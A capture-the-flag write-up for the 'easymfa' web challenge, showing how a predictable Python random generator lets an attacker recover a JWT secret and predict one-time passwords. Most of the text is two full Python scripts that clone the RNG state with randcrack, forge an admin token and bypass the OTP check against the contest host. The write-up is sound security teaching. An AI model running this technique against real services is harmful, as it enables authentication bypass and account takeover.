{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Initial thoughts", "initial-thoughts")}}

{{text("This challange gives us a source code of a web application.")}}

{{text("It contains a password generation endpoint and a flag endpoint which will return the flag if our current user is admin and a one-time password is correct.")}}

{{text("In order to become admin, we probably need to generate a valid JWT token in which we set our user to admin. For us to do that we need the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>JWT_SECRET_KEY</code>.")}}

{{text("It got generated using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>get_random_string</code> function which will generate a byte string of size length.")}}

{{text("If we try to use this function ourselves, we can see what it returns. In my case it was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>b'B\\xa1\\xe4\\t\\x1cd\\x02o\\xf4\\xdbA\\)\\xbc\\xe1\\x92\\x97\\xe9\\xfc!\\x97\\xce\\x97f+\\xa3[\\xa9\\x07r\\xbb_*'</code>.")}}

{{text("We need to figure out a way to guess what the application uses as the secret key, but how?")}}

{{text("Going forward, the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>random_passwords</code> variable gets set using the same <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>get_random_string</code> function which creates <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>384</code> strings.")}}

{{text("After that, the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/generate</code> endpoint. It checks if JWT token is present, if not, it assumes index = 0. If it is present,  it gets current index + 1. Then it creates a new JWT token which holds the value of the new password index.")}}

{{text("To put it simply, it iterates over 384 random passwords in a controlled way.")}}

{{header("Getting the secret key", "getting-the-secret-key")}}

{{text("Because of how many passwords there are, it will allow us to get the JWT secret key by using this tool.")}}

{{link("https://github.com/tna0y/Python-random-module-cracker", "./../static/writeups/images/github.jpg",  "randcrack - Python random module cracker")}}

{{text("This tool will allow us to, after seeing 624 32-bit outputs, clone the internal state of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>random</code> module which is used by <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>get_random_string</code> and predict which value will come next.")}}

{{text("What we need to do is get 312 passwords from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/generate</code> endpoint, turn them into 624 32-bit ints which will be used to reconstruct the RNG state using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>randcrack</code>. After that we will generate our own token where <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>current_user = admin</code> and pass the first <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>if</code> statement from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/flag</code> endpoint.")}}

{{text("Below is a working script that will generate a valid admin token for us.")}}

{{console("import base64
import requests
import struct
import jwt 
from randcrack import RandCrack

HOST = \"https://easymfa.ecsc25.hack.cert.pl\"
PASSWORD_COUNT = 384

def chunk(data: bytes, size: int):
    for i in range(0, len(data), size):
        yield data[i:i + size]

def collect_passwords():
    passwords = []
    headers = {}
    token = None
    for _ in range(PASSWORD_COUNT):
        r = requests.get(f\"{HOST}/generate\", headers=headers)
        r.raise_for_status()
        data = r.json()
        passwords.append(data['password'])
        token = data['token']
        headers = {'Authorization': f'Bearer {token}'}
    return passwords

def reconstruct_rng(passwords):
    rc = RandCrack()
    ints = []

    for b64 in passwords:
        raw = base64.b64decode(b64)
        parts = list(chunk(raw, 4))
        for part in parts[::-1]:
            ints.append(int.from_bytes(part, 'big'))
        if len(ints) >= 624:
            break

    for i in ints[:624]:
        rc.submit(i)

    rc.offset(-len(ints))
    rc.offset(-8)
    return rc

def recover_jwt_secret(rc):
    secret_int = rc.predict_getrandbits(256)
    return secret_int.to_bytes(32, 'big')

def forge_admin_token(secret_key: bytes):
    payload = {
        'sub': 'admin',
        'identity': 'admin',
        'type': 'access',
        'fresh': False,
        'jti': '0',
        'iat': 0,
        'nbf': 0,
        'exp': 9999999999,
        'current': 0
    }
    token = jwt.encode(payload, secret_key, algorithm='HS256')
    return token

if __name__ == '__main__':
    print(\"Collecting passwords...\")
    passwords = collect_passwords()

    print(\"Reconstructing RNG\")
    rc = reconstruct_rng(passwords)

    print(\"Predicting JWT secret key...\")
    jwt_secret = recover_jwt_secret(rc)
    print('Recovered JWT_SECRET_KEY:', jwt_secret)

    print(\"Forging admin token...\")
    admin_token = forge_admin_token(jwt_secret)
    print(\"Admin token:\", admin_token)")}}

{{text("Notice the use of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.offset()</code>. If we didn't use it, the script would predict the next value that comes after generating  all the passwords and the JWT secret. Because of that we need to go backwards, all the way to the start since the key is generated before the passwords in the application. We simply go before the JWT secret and the passwords were generated and predict the next 256 bits, which is the length of our secret key.")}}

{{text("We can test our key by sending a request to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/flag</code> endpoint.")}}

{{image("../../static/writeups/easymfa/images/000001.jpg")}}

{{text("We get the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Nope, it was OTP</code>, so the script correctly verifies our token in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>get_jwt_identity()</code> function.")}}

{{header("Predicting the OTP", "predicting-the-otp")}}

{{text("Next step is getting the OTP that will be generated by the application.")}}

{{text("Since the application returns to us a valid OTP, we can just send 312 requests with the wrong OTP, reconstruct the RNG state just like the last time and predict the next password value.")}}

{{text("I created another script that will do just that.")}}

{{console("import base64
import requests
import struct
from randcrack import RandCrack

HOST = \"https://easymfa.ecsc25.hack.cert.pl\"
JWT_TOKEN = \"VALID_TOKEN\"
OTP_REQUEST_COUNT = 312

def chunk(data: bytes, size: int):
    for i in range(0, len(data), size):
        yield data[i:i + size]

def collect_otps(jwt_token):
    headers = {'Authorization': f'Bearer {jwt_token}'}
    otps = []

    for _ in range(OTP_REQUEST_COUNT):
        resp = requests.post(f\"{HOST}/flag\", headers=headers, json={'OTP': 'AAAAAAAAAAA='})
        if resp.status_code == 403:
            error_message = resp.text
            if \"it was\" in error_message:
                otp_b64 = error_message.split(\"it was \")[1].split('\"')[0].strip()
                otps.append(otp_b64)
            else:
                print(\"Unexpected 403 response format.\")
        else:
            print(f\"Unexpected status code: {resp.status_code}\")
            print(resp.text)

    return otps


def reconstruct_rng_from_otps(otps):
    rc = RandCrack()
    ints = []

    for otp_b64 in otps:
        raw = base64.b64decode(otp_b64)
        parts = list(chunk(raw, 4))
        for part in parts[::-1]:
            ints.append(int.from_bytes(part, 'big'))

    for i in ints[:624]:
        rc.submit(i)

    return rc

def predict_next_otp(rc):
    otp_int = rc.predict_getrandbits(64)
    otp_bytes = otp_int.to_bytes(8, 'big')
    return base64.b64encode(otp_bytes).decode()

def get_flag(predicted_otp, jwt_token):
    headers = {'Authorization': f'Bearer {jwt_token}'}
    resp = requests.post(f\"{HOST}/flag\", headers=headers, json={'OTP': predicted_otp})
    if resp.status_code == 200:
        return resp.json()
    else:
        return {
            \"error\": \"Failed to retrieve flag\",
            \"status_code\": resp.status_code,
            \"response_text\": resp.text
        }

if __name__ == '__main__':
    print(\"Collecting OTPs\")
    otp_list = collect_otps(JWT_TOKEN)

    print(\"Reconstructing RNG state\")
    rc = reconstruct_rng_from_otps(otp_list)

    print(\"Predicting next OTP\")
    predicted_otp = predict_next_otp(rc)
    print(f\"Predicted OTP: {predicted_otp}\")

    print(\"Submitting OTP to get flag\")
    flag = get_flag(predicted_otp, JWT_TOKEN)
    print(\"FLAG:\", flag)")}}

{{text("Remember to enter your own JWT token and run the script.")}}

{{image("../../static/writeups/easymfa/images/000002.jpg")}}

{{script()}}